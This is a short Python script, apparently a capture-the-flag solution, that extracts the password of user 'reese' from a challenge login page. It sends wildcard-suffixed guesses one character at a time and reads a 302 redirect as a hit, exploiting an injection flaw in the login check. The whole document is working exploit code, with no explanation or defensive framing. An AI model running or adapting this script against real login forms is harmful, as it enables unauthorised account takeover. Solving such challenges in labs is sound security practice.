import requests

url = 'http://xx.xx.xx.xx/login' # Challenge URL login page
file_path = '/path/to/password_chars.txt'
nextchar = ''

with open(file_path, 'r') as file:
    line_count = len(file.readlines())

while True:
    failed_attempt=0

    with open(file_path, 'r') as file:
        for line in file:
            character = nextchar + line.strip() + '*'

            data = {
                'username': 'reese',
                'password': character
            }

            response = requests.post(url, data=data, allow_redirects=False)

            # Check the response
            if response.status_code == 302 and response.headers.get('Location') == '/':
                print(f'Guess for {character} successful')
                nextchar = character[:-1]
                break
            else:
                print(f'Guess for {character} failed')
                failed_attempt+=1
        
        if failed_attempt == line_count:
            break

print(f'Password is {character[:-2]}')
